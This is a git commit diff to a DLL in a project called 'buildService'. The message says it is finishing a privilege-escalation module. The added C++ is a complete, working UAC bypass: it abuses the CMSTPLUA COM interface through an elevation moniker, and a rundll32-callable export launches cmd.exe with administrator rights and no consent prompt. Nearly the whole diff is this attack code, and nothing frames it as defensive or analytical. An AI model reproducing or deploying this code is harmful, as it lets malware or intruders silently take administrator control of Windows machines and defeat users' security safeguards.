83f5fe44030ff1b1b8fe564d928ffb553a4257c3
lfish <shineccy@outlook.com>
2019-10-25 09:12:11 +0800

    正在完成提权模块

--- buildService/dllmain.cpp
+++ buildService/dllmain.cpp
@@ -1,6 +1,119 @@
 ﻿// dllmain.cpp : 定义 DLL 应用程序的入口点。
 #include "pch.h"
 
+#include <objbase.h>
+#include <strsafe.h>
+#include <stdio.h>
+
+#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
+#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"
+
+typedef interface ICMLuaUtil ICMLuaUtil;
+
+typedef struct ICMLuaUtilVtbl {
+
+	BEGIN_INTERFACE
+
+		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
+			__RPC__in ICMLuaUtil* This,
+			__RPC__in REFIID riid,
+			_COM_Outptr_  void** ppvObject);
+
+	ULONG(STDMETHODCALLTYPE* AddRef)(
+		__RPC__in ICMLuaUtil* This);
+
+	ULONG(STDMETHODCALLTYPE* Release)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method1)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method2)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method3)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method4)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method5)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method6)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* ShellExec)(
+		__RPC__in ICMLuaUtil* This,
+		_In_     LPCWSTR lpFile,
+		_In_opt_  LPCTSTR lpParameters,
+		_In_opt_  LPCTSTR lpDirectory,
+		_In_      ULONG fMask,
+		_In_      ULONG nShow
+		);
+
+	HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(
+		__RPC__in ICMLuaUtil* This,
+		_In_      HKEY hKey,
+		_In_opt_  LPCTSTR lpSubKey,
+		_In_opt_  LPCTSTR lpValueName,
+		_In_      LPCTSTR lpValueString
+		);
+
+	HRESULT(STDMETHODCALLTYPE* Method9)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method10)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method11)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method12)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method13)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method14)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method15)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method16)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method17)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method18)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method19)(
+		__RPC__in ICMLuaUtil* This);
+
+	HRESULT(STDMETHODCALLTYPE* Method20)(
+		__RPC__in ICMLuaUtil* This);
+
+	END_INTERFACE
+
+} *PICMLuaUtilVtbl;
+
+interface ICMLuaUtil
+{
+	CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
+};
+
+HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid);
+
+BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable);
+
+// import func called by rundll32.exe
+void CALLBACK HelloMyDinner(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow);
+
+
+
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
@@ -17,3 +130,77 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     return TRUE;
 }
 
+// import func called by rundll32.exe
+void CALLBACK HelloMyDinner(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
+{
+	puts(lpszCmdLine);
+	CMLuaUtilBypassUAC((LPWSTR)L"C:\\Windows\\System32\\cmd.exe");
+}
+
+HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
+{
+	BIND_OPTS3 bo;
+	WCHAR wszCLSID[MAX_PATH] = { 0 };
+	WCHAR wszMonikerName[MAX_PATH] = { 0 };
+	HRESULT hr = 0;
+
+	// init env of COM
+	::CoInitialize(NULL);
+
+	// construct string
+	::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
+	hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), 
+		L"Elevation:Administrator!new:%s", wszCLSID);
+	if (FAILED(hr))
+	{
+		return hr;
+	}
+
+	// set BIND_OPTS3
+	::RtlZeroMemory(&bo, sizeof(bo));
+	bo.cbStruct = sizeof(bo);
+	bo.hwnd = hWnd;
+	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
+
+	// create get name object and get COM object
+	hr = ::CoGetObject(wszMonikerName, &bo, riid, ppVoid);
+	return hr;
+}
+
+BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
+{
+	HRESULT hr = 0;
+	CLSID clsidICMLuaUtil = { 0 };
+	IID iidICMLuaUtil = { 0 };
+	ICMLuaUtil* CMLuaUtil = NULL;
+	BOOL bRet = FALSE;
+
+	do {
+		::CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
+		::IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);
+
+		// improve privilege
+		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
+		if (FAILED(hr))
+		{
+			break;
+		}
+
+		// start proc
+		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
+		if (FAILED(hr))
+		{
+			break;
+		}
+
+		bRet = TRUE;
+	} while (FALSE);
+
+	// release
+	if (CMLuaUtil)
+	{
+		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
+	}
+
+	return bRet;
+}
